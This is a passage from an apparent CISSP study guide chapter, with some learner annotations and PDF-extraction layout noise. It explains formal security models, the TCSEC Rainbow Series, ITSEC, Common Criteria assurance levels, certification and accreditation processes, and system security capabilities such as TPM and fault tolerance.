The Goguen-Meseguer model is based on predetermining the set or domain—a list of objects that a subject can access. This model is based on automation theory and domain separation. This means subjects are allowed only to perform predetermined actions against predetermined objects. When similar users are grouped into their own domain (that is, collective), the members of one subject domain cannot interfere with the mem- bers of another subject domain. Thus, subjects are unable to interfere with each other’s activities.
Sutherland Model
an integrity model. It focuses on preventing interference in sup- port of integrity. It is formally based on the state machine model and the information flow model. However, it does not directly indicate specific mechanisms for protection of integ- rity. Instead, the model is based on the idea of defining a set of system states, initial states, and state transitions. Through the use of only these predetermined secure states, integrity is maintained and interference is prohibited.
A common example of the Sutherland model is its use to prevent a convert channel from being used to influence the outcome of a process or activity. (For a discussion of convert channels, see Chapter 9.)
 Graham-Denning Model
The Graham-Denning model is focused on the secure creation and deletion of both subjects and objects. Graham-Denning is a collection of eight primary protection rules or actions that define the boundaries of certain secure actions:
Securely create an object.
Securely create a subject.
Securely delete an object.
Securely delete a subject.
Securely provide the read access right.
Securely provide the grant access right.
Securely provide the delete access right. Securely provide the transfer access right.
Usually the specific abilities or permissions of a subject over a set of objects is defined in an access matrix (aka access control matrix).
Select Controls and Countermeasures Based on Systems Security Evaluation Models 289
Select Controls and Countermeasures Based on Systems Security Evaluation Models
Those who purchase information systems for certain kinds of applications—think, for example, about national security agencies where sensitive information may be extremely valuable (or dangerous in the wrong hands) or central banks or securities traders where certain data may be worth billions of dollars—often want to understand their security strengths and weaknesses. Such buyers are often willing to consider only systems that have been subjected to formal evaluation processes in advance and have received some kind of security rating. Buyers want to know what they’re buying and, usually, what steps they must take to keep such systems as secure as possible.
When formal evaluations are undertaken, systems are usually subjected to a two-step process: 1. The system is tested and a technical evaluation is performed to make sure that the system’s security capabilities meet criteria laid out for its intended use.
2. The system is subjected to a formal comparison of its design and security criteria and its actual capabilities and performance, and individuals responsible for the security and veracity of such systems must decide whether to adopt them, reject them, or make some changes to their criteria and try again.
Often trusted third parties are hired to perform such evaluations; the most important result from such testing is their “seal of approval” that the system meets all essential criteria.
Regardless of whether the evaluations are conducted inside an organization or
out of house, the adopting organization must decide to accept or reject the proposed systems. An organization’s management must take formal responsibility if and when a system is adopted and be willing to accept any risks associated with its deployment and use.
The three main product evaluation models or classification criteria models addressed here are TCSEC, ITSEC, and Common Criteria.
You should be aware that TCSEC was repealed and replaced by the Common Criteria (as well as many other DoD directives). It is still included here as a historical reference and as an example of static-based assessment criteria
to offset the benefits of dynamic (although subjective) assessment criteria. Keep in mind that the CISSP exam focuses on the “why” of security more than the “how”—in other words, it focuses on the concepts and theories more than the technologies and implementations. Thus, some of this historical information could be present in questions on the exam.
Rainbow Series
Since the 1980s, governments, agencies, institutions, and business organizations of all kinds have faced the risks involved in adopting and using information systems. This led to a historical series of information security standards that attempted to specify minimum acceptable security criteria for various categories of use.
Such categories were important as purchasers attempted to obtain and deploy systems that would protect and preserve their contents or that would meet various mandated security requirements (such as those that contractors must routinely meet to conduct business with the government).
The first such set of standards resulted in the creation of the Trusted Computer System Evaluation Criteria (TCSEC) in the 1980s, as the US Department of Defense (DoD) worked to develop and impose security standards for the systems it purchased and ▪


## used. In turn, this led to a whole series of such publications through the mid-1990s. Since these publications were routinely identified by the color of their covers, they are known collectively as the rainbow series.
Following in the DoD’s footsteps, other governments or standards bodies created com- puter security standards that built and improved on the rainbow series elements. Significant standards in this group include a European model called the Information Technology Security Evaluation Criteria (ITSEC), which was developed in 1990 and used through 1998. Eventually TCSEC and ITSEC were replaced with the so-called Common Criteria, adopted by the United States, Canada, France, Germany, and the United Kingdom in 1998 but more formally known as the “Arrangement on the Recognition of Common Criteria Certificates in the Field of IT Security.” Both ITSEC and the Common Criteria will be discussed in later sections.
When governments or other security-conscious agencies evaluate information systems, they make use of various standard evaluation criteria. In 1985, the National Computer Security Center (NCSC) developed the TCSEC, usually called the Orange Book because of the color of this publication’s covers. The TCSEC established guidelines to be used when evaluating a stand-alone computer from the security perspective. These guidelines address basic security functionality and allow evaluators to measure and rate a system’s functional- ity and trustworthiness. In the TSCEC, in fact, functionality and security assurance are combined and not separated as they are in security criteria developed later. TCSEC guide- lines were designed to be used when evaluating vendor products or by vendors to ensure that they build all necessary functionality and security assurance into new products.
Next, we’ll take a look at some of the details in the Orange Book itself and then talk about some of the other important elements in the rainbow series.
TCSEC - Orange Book
  - Confidentiality
  - D, C12, B12, A12
Red book
  - Trsuted network interpretation of TCSEC
  - Confidentiality and integrity
  - None, C12, B2
 ▪


##  Green book
  - Password management guidlines
TCSEC Classes and Required Functionality
TCSEC combines the functionality and assurance rating of the confidentiality protection offered by a system into four major categories. These categories are then subdivided into additional subcategories identified with numbers, such as C1 and C2. Furthermore, TCSEC’s categories are assigned through the evaluation of a target system. Applicable systems are stand-alone systems that are not networked. TCSEC defines the following major categories:
Select Controls and Countermeasures Based on Systems Security Evaluation Models 291 Category A
Category B
Category C
The list that follows includes brief discussions of categories A through C, along with numeric suffixes that represent any applicable subcategories (Figure 8.6).
FIGURE 8.6 The levels of TCSEC
Verified protection. The highest level of security. Mandatory protection.
Discretionary protection.
Minimal protection. Reserved for systems that have been evaluated but do not meet requirements to belong to any other category.
Category D
Level Label
D C1 C2 B1 B2 B3
  Requirements
Minimal Protection Discretionary Protection Controlled Access Protection Labeled Security
Structured Protection Security Domains
                           A1 Verified Protection
Discretionary Protection (Categories C1, C2) Discretionary protection systems provide basic access control. Systems in this category do provide some security controls but are lacking in more sophisticated and stringent controls that address specific needs for secure systems. C1 and C2 systems provide basic controls and complete documentation for system installation and configuration.
Discretionary Security Protection (C1) A discretionary security protection system con- trols access by user IDs and/or groups. Although there are some controls in place that limit object access, systems in this category provide only weak protection.
Controlled Access Protection (C2) Controlled access protection systems are stronger than C1 systems. Users must be identified individually to gain access to objects. C2 systems must also enforce media cleansing. With media cleansing, any media that are reused by another user must first be thoroughly cleansed so that no remnant of the previ- ous data remains available for inspection or use. Additionally, strict logon procedures must be enforced that restrict access for invalid or unauthorized users.
Mandatory Protection (Categories B1, B2, B3) Mandatory protection systems provide more security controls than category C or D systems. More granularity of control is man- dated, so security administrators can apply specific controls that allow only very limited
292 Chapter 8 ■ Principles of Security Models, Design, and Capabilities
sets of subject/object access. This category of systems is based on the Bell-LaPadula
model. Mandatory access is based on security labels.
Labeled Security (B1) In a labeled security system, each subject and each object has a security label. A B1 system grants access by matching up the subject and object labels and comparing their permission compatibility. B1 systems support sufficient security to house classified data.
Structured Protection (B2) In addition to the requirement for security labels (as in B1 systems), B2 systems must ensure that no convert channels exist. Operator and adminis- trator functions are separated, and process isolation is maintained. B2 systems are suf- ficient for classified data that requires more security functionality than a B1 system can deliver.
Security Domains (B3) Security domain systems provide more secure functionality by further increasing the separation and isolation of unrelated processes. Administration functions are clearly defined and separate from functions available to other users. The
 focus of B3 systems shifts to simplicity to reduce any exposure to vulnerabilities in unused or extra code. The secure state of B3 systems must also be addressed during the initial boot process. B3 systems are difficult to attack successfully and provide sufficient secure controls for very sensitive or secret data.
Verified Protection (Category A1) Verified protection systems are similar to B3 systems in the structure and controls they employ. The difference is in the development cycle. Each phase of the development cycle is controlled using formal methods. Each phase of the design is documented, evaluated, and verified before the next step is taken. This forces extreme security consciousness during all steps of development and deployment and is the only way to formally guarantee strong system security.
A verified design system starts with a design document that states how the resulting sys- tem will satisfy the security policy. From there, each development step is evaluated in the context of the security policy. Functionality is crucial, but assurance becomes more impor- tant than in lower security categories. A1 systems represent the top level of security and are designed to handle top-secret data. Every step is documented and verified, from the design all the way through to delivery and installation.
Other Colors in the Rainbow Series
Altogether, there are nearly 30 titles in the collection of DoD documents that either add to or further elaborate on the Orange Book. Although the colors don’t necessarily mean anything, they’re used to identify publications in this series.
It is important to understand that most of the books in the rainbow series are now outdated and have been replaced by updated standards, guide- lines, and directives. However, they are still included here for reference to address any exam items.
Select Controls and Countermeasures Based on Systems Security Evaluation Models 293
Other important elements in this collection of documents include the following:
Red Book Because the Orange Book applies only to stand-alone computers not attached to a network, and so many systems were used on networks (even in the 1980s), the Red Book was developed to interpret the TCSEC in a networking context. In fact, the official title of the Red Book is Trusted Network Interpretation of the TCSEC so it could be con- sidered an interpretation of the Orange Book with a bent on networking. Quickly the Red Book became more relevant and important to system buyers and builders than the Orange Book. The following list includes a few other
 functions of the Red Book:
■■■■■ ■
Rates confidentiality and integrity
Addresses communications integrity
Addresses denial of service protection
Addresses compromise (in other words, intrusion) protection and prevention
Is restricted to a limited class of networks that are labeled as “centralized networks with a single accreditation authority”
Uses only four rating levels: None, C1 (Minimum), C2 (Fair), and B2 (Good)
Green Book The Green Book, or the Department of Defense Password Management Guidelines, provides password creation and management guidelines; it’s important for those who configure and manage trusted systems.
Table 8.2 has a more complete list of books in the rainbow series. For more information and to download the books, see the Rainbow Series web page here:
http://csrc.nist.gov/publications/secpubs/index.html TA B L E 8 . 2 Important rainbow series elements
Publication Number
5200.28-STD
CSC-STD-002-85 CSC-STD-003-85 NCSC-TG-001
NCSC-TG-002
NCSC-TG-002-85
Title
DoD Trusted Computer System Evaluation Criteria
 DoD Password Management Guidelines
Guidance for Applying TCSEC in Specific Environments A Guide to Understanding Audit in Trusted Systems Trusted Product Evaluation: A Guide for Vendors
PC Security Considerations
Book name
Orange Book
Green Book Yellow Book
Tan Book
Bright Blue Book
Light Blue Book
294 Chapter 8 ■ Principles of Security Models, Design, and Capabilities TABLE 8.2 Importantrainbowserieselements (continued)
Publication Number
NCSC-TG-003
NCSC-TG-004 NCSC-TG-005 NCSC-TG-006
NCSC-TG-007 NCSC-TG-008 NCSC-TG-009
Title
A Guide to Understanding Discretionary Access Controls in Trusted Systems Glossary of Computer Security Terms Trusted Network Interpretation
A Guide to Understanding Configuration Man- agement in Trusted Systems A Guide to Understanding Design Documentation in Trusted Systems
A Guide to Understanding Trusted Distribution in Trusted Systems
 Computer Security Subsystem Interpretation of the TCSEC
Book name
Neon Orange Book
Aqua Book Red Book Amber Book
Burgundy Book Lavender Book Venice Blue Book
Given all the time and effort that went into formulating the TCSEC, it’s not unreason- able to wonder why evaluation criteria have evolved to newer, more advanced standards. The relentless march of time and technology aside, these are the major critiques of TCSEC; they help to explain why newer standards are now in use worldwide:
■ ■ ■ ■
Although the TCSEC puts considerable emphasis on controlling user access to infor- mation, it doesn’t exercise control over what users do with information once access is granted. This can be a problem in military and commercial applications alike.
Given the origins of evaluation standards at the US Department of Defense, it’s understandable that the TCSEC focuses its concerns entirely on confidentiality, which assumes that controlling how users access data is of primary importance and that concerns about data accuracy or integrity are irrelevant. This doesn’t work in commercial environments where concerns about data accuracy and integrity can be more important than concerns about confidentiality.
Outside the evaluation standards’ own emphasis on access controls, the TCSEC does not carefully address the kinds of personnel, physical, and procedural policy matters or safeguards that must be exercised to fully implement security policy. They don’t deal much with how such matters can impact system security either.
The Orange Book, per se, doesn’t deal with networking issues (though the Red Book, developed later in 1987, does).
To some extent, these criticisms reflect the unique security concerns of the military, which developed the TCSEC. Then, too, the prevailing computing tools and technologies widely available at the time (networking was just getting started in 1985)
 ▪


## had an impact as well. Certainly, an increasingly sophisticated and holistic view of security within organizations helps to explain why and where the TCSEC also fell short, procedurally
Select Controls and Countermeasures Based on Systems Security Evaluation Models 295
and policy-wise. But because ITSEC has been largely superseded by the Common Criteria, coverage in the next section explains ITSEC as a step along the way toward the Common Criteria (covered in the section after that).
ITSEC Classes and Required Assurance and Functionality
The ITSEC represents an initial attempt to create security evaluation criteria in Europe.
It was developed as an alternative to the TCSEC guidelines.
The ITSEC guidelines evaluate the functionality and assurance of a system using separate ratings for each category. In this context, a system’s functionality is a measurement of the system’s utility value for users. The functionality rating of a system states how well the system performs all necessary func- tions based on its design and intended purpose. The assurance rating represents the degree of confidence that the system will work properly in a consistent manner.
ITSEC refers to any system being evaluated as a target of evaluation (TOE). All ratings are expressed as TOE ratings in two categories. ITSEC uses two scales to rate functionality and assurance.
The functionality of a system is rated from F-D through F-B3 (there is no F-A1). The assurance of a system is rated from E0 through E6. Most ITSEC ratings generally cor- respond with TCSEC ratings (for example, a TCSEC C1 system corresponds to an ITSEC F-C1, E1 system). See Table 8.4 (at the end of the section “Structure of the Common Criteria”) for a comparison of TCSEC, ITSEC, and Common Criteria ratings.
There are some instances where the F ratings of ITSEC are defined using F1 through F5 rather than reusing the labels from TCSEC. These alternate labels are F1 = F-C1, F2 = F-C2, F3 = F- B1, F4 = F-B2, and F5 = F-B3. There is no numbered F rating for F-D, but there are a few cases where F0 is used. This is a fairly ridiculous label because if there are no functions to rate, there is no need for a rating label.
   Differences between TCSEC and ITSEC are many and varied. The following are some of the most important differences between the two standards:
■ ■ ■
Although the TCSEC concentrates almost exclusively on confidentiality, ITSEC addresses concerns about the loss of integrity and availability in addition to confidentiality, thereby covering all three elements so important to maintaining complete information security.
ITSEC does not rely on the notion of a TCB, and it doesn’t require that a system’s security components be isolated within a TCB.
Unlike TCSEC, which required any changed systems to be reevaluated anew—be it for operating system upgrades, patches, or fixes; application upgrades or changes; and so forth—ITSEC includes coverage for maintaining targets of evaluation after such changes occur without requiring a new formal evaluation.
For more information on ITSEC (now largely supplanted by the Common Criteria, covered in the next section), please view the overview document at
296 Chapter 8 ■ Principles of Security Models, Design, and Capabilities https://www.bsi.bund.de/cae/servlet/contentblob/471346/publicationFile /30220/itsec-en_pdf.pdf Or you can view the original ITSEC specification here: http://www.ssi.gouv.fr/uploads/2015/01/ITSEC-uk.pdf
Common Criteria
More global effort
Ultimately, it results in the ability to purchase CC-evaluated products (where CC, of course, stands for Common Criteria). The Common Criteria defines various levels of testing and confirmation of sys- tems’ security capabilities, and the number of the level indicates what kind of testing and confirmation has been performed. Nevertheless, it’s wise to observe that even the high- est CC ratings do not equate to a guarantee that such systems are completely secure or that they are entirely devoid of vulnerabilities or
 susceptibilities to exploit. The Common Criteria was designed as a product evaluation model.
Recognition of Common Criteria
Caveats and disclaimers aside, a document titled “Arrangement on the Recognition of Common Criteria Certificates in the Field of IT Security” was signed by repre- sentatives from government organizations in Canada, France, Germany, the United Kingdom, and the United States in 1998, making it an international standard. This document was converted by ISO into an official standard: ISO 15408, Evaluation Criteria for Information Technology Security. The objectives of the CC guidelines are as follows:
■■ ■ ■■■
To add to buyers’ confidence in the security of evaluated, rated IT products
To eliminate duplicate evaluations (among other things, this means that if one country, agency, or validation organizations follows the CC in rating specific systems and configurations, others elsewhere need not repeat this work)
To keep making security evaluations and the certification process more cost effective and efficient
To make sure evaluations of IT products adhere to high and consistent standards To promote evaluation and increase availability of evaluated, rated IT products
To evaluate the functionality (in other words, what the system does) and assurance (in other words, how much can you trust the system) of the TOE
Common Criteria documentation is available at www.niap-ccevs.org/cc-scheme/. Visit this site to get information on the current version of the CC guidelines and guidance on using the CC along with lots of other useful, relevant information.
The Common Criteria process is based on two key elements: protection profiles and security targets. Protection profiles (PPs) specify for a product that is to be eval- uated (the TOE) the security requirements and protections, which are considered the
Select Controls and Countermeasures Based on Systems Security Evaluation Models 297 security desires or the “I want” from a customer. Security targets (STs) specify the
claims of security from the vendor that are built into a TOE. STs are considered the implemented security measures or the “I will provide” from the vendor. In addition to offering security targets, vendors may offer packages of additional security features. A package is an inter- mediate grouping of security requirement components that can be added or removed from a TOE (like the option packages when purchasing a new vehicle).
The PP is compared to various STs from the selected vendor’s TOEs. The closest or best match is what the client purchases. The client initially selects a vendor based on published or marketed evaluation assurance levels (EALs) (see the next section for more details on EALs), for currently available systems. Using Common Criteria to choose a vendor allows clients to request exactly what they need for security rather than having to use static fixed security levels. It also allows vendors more flexibility on what they design and create. A well-defined set of Common Criteria supports subjectivity and versatility, and it automatically adapts to changing technology and threat conditions. Furthermore, the EALs provide a method for comparing vendor systems that is more standardized (like the old TCSEC).
Structure of the Common Criteria
EAL: evaluation auusrance level.
The CC guidelines are divided into three areas, as follows:
Part 1 Introduction and General Model describes the general concepts and underlying model used to evaluate IT security and what’s involved in specifying targets of evalua- tion. It contains useful introductory and explanatory material for those unfamiliar with the workings of the security evaluation process or who need help reading and interpreting evaluation results.
Part 2 Security Functional Requirements describes various functional requirements in terms of security audits, communications security, cryptographic support for security, user data protection, identification and authentication, security management, TOE security functions (TSFs), resource utilization, system access, and trusted paths. Covers the com- plete range of security functions as envisioned in the CC evaluation process, with addi- tional appendices (called annexes) to explain each functional area.
Part 3 Security Assurance covers assurance requirements for TOEs in the areas of con- figuration management, delivery and operation, development, guidance documents, and life-cycle support plus assurance tests and vulnerability assessments. Covers the complete range of security assurance checks and protects profiles as envisioned in the CC evaluation process, with information on evaluation assurance levels that describe how systems are designed, checked, and tested. Most important of all, the information that appears in these various CC documents (worth at least a cursory read-through) are the evaluation assurance levels commonly known as EALs. Table 8.3 summarizes EALs 1 through 7. For a complete description of EALs, consult the CC documents hosted at https://www.niap-ccevs.org/ and view Part 3 of the latest revision.
T A BLE Level EAL1 EAL2 EAL3 EAL4 EAL5 EAL6 EAL7
8 . 3 CC evaluation assurance levels
Assurance level
Functionally tested
Structurally tested
Methodically tested and checked Methodically designed, tested, and reviewed Semi-formally designed and tested Semi-formally veri- fied, designed, and tested Formally verified, designed, and tested Description
 Applies when some confidence in correct operation is required but where threats to security are not serious. This is of value when independent assurance that due care has been exercised in protecting personal infor- mation is necessary.
Applies when delivery of design information and test results are in keeping with good commercial practices. This is of value when developers or users require low to moderate levels of independently assured security. IT is especially relevant when evaluating legacy systems.
Applies when security engineering begins at the design stage and is carried through without substantial sub- sequent alteration. This is of value when developers
or users require a moderate level of independently assured security, including thorough investigation of TOE and its development.
Applies when rigorous, positive security engineering and good commercial development practices are used. This does not require substantial specialist knowledge, skills, or resources. It involves independent testing of all TOE security functions.
Uses rigorous security engineering and commercial development practices, including specialist security engineering techniques, for semi-formal testing. This applies when developers or users require a high level of independently assured security in a planned devel- opment approach, followed by rigorous development.
Uses direct, rigorous security engineering techniques at all phases of design, development, and testing to produce a premium TOE. This applies when TOEs for high-risk situations are needed, where the value of protected assets justifies additional cost. Extensive testing reduces risks of penetration, probability of cover channels, and vulnerability to attack.
Used only for highest-risk situations or where high- value assets are involved. This is limited to TOEs where tightly focused security functionality is subject to extensive formal analysis and testing.
Select Controls and Countermeasures Based on Systems Security Evaluation Models 299
Though the CC guidelines are flexible and accommodating enough to capture most secu- rity needs and requirements, they are by no means perfect. As with other evaluation crite- ria, the CC guidelines do nothing to make sure that how users act on data is also secure. The CC guidelines also do not address administrative issues outside the specific purview of security. As with other evaluation criteria, the CC guidelines do not include evaluation of security in situ—that is, they do not address controls related to personnel, organizational practices and procedures, or physical security. Likewise, controls over electromagnetic emissions are not addressed, nor are the criteria for rating the strength of cryptographic algorithms explicitly laid out. Nevertheless, the CC guidelines represent some of the best techniques whereby systems may be rated for security. To conclude this discussion of secu- rity evaluation standards, Table 8.4
 summarizes how various ratings from the TCSEC, ITSEC, and the CC can be compared. Table 8.4 shows that ratings from each standard have similar, but not identical evaluation criteria.
TA B L E
8 . 4 Comparing security evaluation standards
TCSEC ITSEC
D F-D+E0 C1 F-C1+E1 C2 F-C2+E2 B1 F-B1+E3 B2 F-B2+E4 B3 F-B3+E5 A1 F-B3+E6
CC description
EAL0, EAL1 EAL2 EAL3
EAL4
EAL5 EAL6 EAL7
Minimal/no protection Discretionary security mechanisms Controlled access protection Labeled security protection Structured security protection Security domains
Verified security design
Industry and International Security Implementation Guidelines
In addition to overall security access models, such as Common Criteria, there are many other more specific or focused security standards for various aspects of storage, communi- cation, transactions, and the like. Two of these standards you should be familiar with are Payment Card Industry–Data Security Standard (PCI-DSS) and International Organization for Standardization (ISO).
PCI-DSS is a collection of requirements for improving the security of electronic payment transactions. These standards were defined by the PCI Security Standards Council members, who are primarily credit card banks and financial institutions. The PCI-DSS defines requirements for security management, policies, procedures, network architecture, software design, and other critical protective measures. For more information on PCI-DSS, please visit the website at www.pcisecuritystandards.org.
 ▪


## ISO is a worldwide standards-setting group of representatives from various national standards organizations. ISO defines standards for industrial and commercial equip- ment, software, protocols, and management, among others. It issues six main products: International Standards, Technical Reports, Technical Specifications, Publicly Available Specifications, Technical Corrigenda, and Guides. ISO standards are widely accepted across many industries and have even been adopted as requirements or laws by various govern- ments. For more information in ISO, please visit the website at www.iso.org.
Certification and Accreditation
to evaluate how well a system meets their security requirements.
The formal evaluation process is divided into two phases, certification and
accreditation.
The actual steps required in each phase depend on the evaluation criteria an
organization chooses.
A CISSP candidate must understand the need for each phase and the criteria commonly used to evaluate systems. The two evaluation phases are discussed in
the next two sections, and then we present various evalu- ation criteria and considerations you must address when assessing the security of a system. Certification and accreditation processes are used to assess the effectiveness of application security as well as operating system and hardware security.
The process of evaluation provides a way to assess how well a system measures up to a desired level of security. Because each system’s security level depends on many factors, all of them must be taken into account during the evaluation. Even though a system is initially described as secure, the installation process, physical environment, and general configu- ration details all contribute to its true general security. Two identical systems could be assessed at different levels of security because of configuration or installation differences.
The terms certification, accreditation, and maintenance as used in the following sections are official terms used by the defense establishment, and you should be familiar with them.
Certification and accreditation are additional steps in the software and IT systems devel- opment process normally required from defense contractors and others working in a mili- tary environment. The official definitions of these terms as used by the US
   government are from Department of Defense Instruction 5200.40, Enclosure 2.
Certification
The first phase in a total evaluation process is certification. Certification is the compre- hensive evaluation of the technical and nontechnical security features of an IT system and other safeguards made in support of the accreditation process to establish the extent to which a particular design and implementation meets a set of specified security requirements.
System certification is the technical evaluation of each part of a computer system to assess its concordance with security standards. First, you must choose evaluation criteria (we will present criteria alternatives in later sections). Once you select criteria to use, you analyze each system component to determine whether it satisfies the desired security goals. The certification analysis includes testing the system’s hardware, software, and configura- tion. All controls are evaluated during this phase, including administrative, technical, and physical controls.
After you assess the entire system, you can evaluate the results to determine the security level the system supports in its current environment. The environment of a system is a criti- cal part of the certification analysis, so a system can be more or less secure depending on its surroundings. The manner in which you connect a secure system to a network can change its security standing. Likewise, the physical security surrounding a system can affect the overall security rating. You must consider all factors when certifying a system.
You complete the certification phase when you have evaluated all factors and determined the level of security for the system. Remember that the certification is valid only for a sys- tem in a specific environment and configuration. Any changes could invalidate the certifica- tion. Once you have certified a security rating for a specific configuration, you are ready to seek acceptance of the system. Management accepts the certified security configuration of a system through the accreditation process.
Accreditation
In the certification phase, you test and document the security capabilities of a system in a specific configuration. With this information in hand, the management of an organization compares the capabilities of a system to the needs of the organization. It is imperative that the security policy clearly states the requirements of a security system. Management reviews the certification information and decides whether the system satisfies the security needs of the organization.
If management decides the certification of the system satisfies their needs, the system is accredited.
Accreditation is the formal declaration by the desig- nated approving authority (DAA) that an IT system is approved to operate in a particular security mode using a prescribed set of safeguards at an acceptable level of risk. Once accreditation is performed, management can formally accept the adequacy of the overall security performance of an evaluated system.
Certification and accreditation do seem similar, and thus it is often a challenge to understand them. One perspective you might consider is that certification is often an internal verification of security and the results of that verification are trusted only by your organization. Accreditation is often performed by a third-party testing service, and the results are trusted by everyone in the world who trusts the specific testing group involved.
The process of certification and accreditation is often iterative. In the accreditation phase, it is not uncommon to request changes to the configuration or additional controls to address security concerns. Remember that whenever you change the configuration, you must recertify the new configuration. Likewise, you need to recertify the system when a specific time period elapses or when you make any configuration changes. Your security policy should specify what conditions require recertification. A sound policy would list the amount of time a certification is valid along with any changes that would require you to restart the certification and accreditation process.
Certification and Accreditation Systems
Two government standards are currently in place for the certification and accreditation of computing systems. The current DoD standard is Risk Management Framework (RMF) (www.dtic.mil/whs/directives/corres/pdf/851001_2014.pdf) which recently replaced DoD Information Assurance Certification and Accreditation Process (DIACAP), which itself replaced the Defense Information Technology Security Certification and Accreditation Process (DITSCAP). The standard for all other US government executive branch departments, agencies, and their contractors and consultants is the Committee on National Security Systems (CNSS) Policy (CNSSP) (www.ncix.gov/ publications/policy/ docs/CNSSP_22.pdf) which replaced National Information Assurance Certification and Accreditation Process (NIACAP). However, the CISSP may refer to either the current standards or the previous ones. Both of these processes are divided into four phases:
Phase 1: Definition Involves the assignment of appropriate project personnel; documentation of the mission need; and registration, negotiation, and creation of a System Security Authorization Agreement (SSAA) that guides the entire certification and accreditation process
Phase 2: Verification Includes refinement of the SSAA, systems development activities, and a certification analysis
Phase 3: Validation Includes further refinement of the SSAA, certification evaluation of the integrated system, development of a recommendation to the DAA, and the DAA’s accreditation decision
Phase 4: Post Accreditation Includes maintenance of the SSAA, system operation, change management, and compliance validation
The NIACAP process, administered by the Information Systems Security Organization of the National Security Agency, outlines three types of accreditation that may be granted. The definitions of these types of accreditation (from National Security Telecommunications and Information Systems Security Instruction 1000) are as follows:
■ ■ ■
For a site accreditation, the applications and systems at a specific, self-contained location are evaluated.
For a type accreditation, an application or system that is distributed to a number of different locations is evaluated.
For a system accreditation, a major application or general support system is evaluated. Understand Security Capabilities of Information Systems 303
Understand Security Capabilities of
Information Systems
The security capabilities of information systems include memory protection, virtualization, Trusted Platform Module, interfaces, and fault tolerance. It is important to carefully assess each aspect of the infrastructure to ensure that it sufficiently supports security. Without an understanding of the security capabilities of information systems, it is impossible to evaluate them, nor is it possible to implement them properly.
Memory Protection
Memory protection is a core security component that must be designed and implemented into an operating system. It must be enforced regardless of the programs executing in the system. Otherwise instability, violation of integrity, denial of service, and disclosure are likely results. Memory protection is used to prevent an active process from interacting with an area of memory that was not specifically assigned or allocated to it.
Memory protection is discussed throughout Chapter 9 in relation to the topics of isolation, virtual memory, segmentation, memory management, and protection rings.
Virtualization
Virtualization technology is used to host one or more operating systems within the memory of a single host computer. This mechanism allows virtually any OS to operate on any hardware. It also allows multiple OSs to work simultaneously on the same hardware. Common examples include VMware, Microsoft’s Virtual PC, Microsoft Virtual Server, Hyper-V with Windows Server, Oracle’s VirtualBox, XenServer, and Parallels Desktop for Mac.
Virtualization has several benefits, such as being able to launch individual instances of serv- ers or services as needed, real-time scalability, and being able to run the exact OS version needed for a specific application. Virtualized servers and services are indistinguishable from traditional servers and services from a user’s perspective. Additionally, recovery from damaged, crashed, or corrupted virtual systems is often quick, simply consisting of replacing the virtual system’s main hard drive file with a clean backup version and then relaunching it. (Additional coverage of virtu- alization and some of its associated risks are covered in Chapter 9 along with cloud computing.)
Trusted Platform Module
The Trusted Platform Module (TPM) is both a specification for a cryptoprocessor chip on
a mainboard and the general name for implementation of the specification. A TPM chip is used to store and process cryptographic keys for the purposes of a hardware supported/imple- mented hard drive encryption system. Generally, a hardware implementation, rather than a software-only implementation of hard drive encryption, is considered to be more secure.
304 Chapter 8 ■ Principles of Security Models, Design, and Capabilities
When TPM-based whole-disk encryption is in use, the user/operator must supply a password or physical USB token device to the computer to authenticate and allow the TPM chip to release the hard drive encryption keys into memory. While this seems similar to a software implementation, the key difference is that if the hard drive is removed from its original system, it cannot be decrypted. Only with the original TPM chip can an encryption be decrypted and accessed. With software-only hard drive encryption, the hard drive can be moved to a different computer without any access or use limitations.
A hardware security module (HSM) is a cryptoprocessor used to manage/store digital encryption keys, accelerate crypto operations, support faster digital signa- tures, and improve authentication. An HSM is often an add-on adapter or peripheral or can be a TCP/IP network device. HSMs include tamper protection to prevent their misuse even if physical access is gained by an attacker. A TPM is just one example of an HSM.
HSMs provide an accelerated solution for large (2,048+ bit) asymmetric encryption cal- culations and a secure vault for key storage. Many certificate authority systems use HSMs to store certificates; ATM and POS bank terminals often employ proprietary HSMs; hard- ware SSL accelerators can include HSM support; and DNSSEC- compliant DNS servers use HSM for key and zone file storage.
Interfaces
A constrained or restricted interface is implemented within an application to restrict what users can do or see based on their privileges. Users with full privileges have access to all the capabilities of the application. Users with restricted privileges have limited access.
Applications constrain the interface using different methods. A common method is to hide the capability if the user doesn’t have permissions to use it. Commands might be available to administrators via a menu or by right-clicking an item, but if a regu- lar user doesn’t have permissions, the command does not appear. Other times, the command is shown but is dimmed or disabled. The regular user can see it but will not be able to use it.
The purpose of a constrained interface is to limit or restrict the actions of both autho- rized and unauthorized users. The use of such an interface is a practical implementation of the Clark-Wilson model of security. Fault Tolerance
Fault tolerance is the ability of a system to suffer a fault but continue to operate. Fault tolerance is achieved by adding redundant components such as additional disks within a redundant array of inexpensive disks (RAID) array, or additional servers within a failover clustered configuration. Fault tolerance is an essential element of security design. It is also considered part of avoiding single points of failure and the implementation of redundancy. For more details on fault tolerance, redundant servers, RAID, and failover solutions, see Chapter 18, “Disaster Recovery Planning.”
Summary
Secure systems are not just assembled; they are designed to support security. Systems that must be secure are judged for their ability to support and enforce the security policy. This process of evaluating the effectiveness of a computer system is certification. The certifica- tion process is the technical evaluation of a system’s ability to meet its design goals. Once a system has satisfactorily passed the technical evaluation, the management of an orga- nization begins the formal acceptance of the system. The formal acceptance process is accreditation.
The entire certification and accreditation process depends on standard evaluation cri- teria. Several criteria exist for evaluating computer security systems. The earliest, TCSEC, was developed by the US Department of Defense. TCSEC, also called the Orange Book, provides criteria to evaluate the functionality and assurance of a system’s security compo- nents. ITSEC is an alternative to the TCSEC guidelines and is used more often in European countries. Regardless of which criteria you use, the evaluation process includes reviewing each security control for compliance with the security policy. The better a system enforces the good behavior of subjects’ access to objects, the higher the security rating.
When security systems are designed, it is often helpful to create a security model to rep- resent the methods the system will use to implement the security policy. We discussed sev- eral security models in this chapter. The Bell-LaPadula model supports data confidentiality only. It was designed for the military and satisfies military concerns. The Biba model and the Clark-Wilson model address the integrity of data and do so in different ways. These two security models are appropriate for commercial applications.
All of this understanding must culminate into an effective system security implementa- tion in terms of preventive, detective, and corrective controls. That’s why you must also know the access control models and their functions. This includes the state machine model, Bell-LaPadula, Biba, Clark-Wilson, the information flow model, the noninterference model, the Take-Grant model, the access control matrix model, and the Brewer and Nash model.
Exam Essentials
Know details about each of the access control models. Know the access control models and their functions. The state machine model ensures that all instances of subjects access- ing objects are secure. The information flow model is designed to prevent unauthorized, insecure, or restricted information flow. The noninterference model prevents the actions of one subject from affecting the system state or actions of another subject. The Take-Grant model dictates how rights can be passed from one subject to another or from a subject
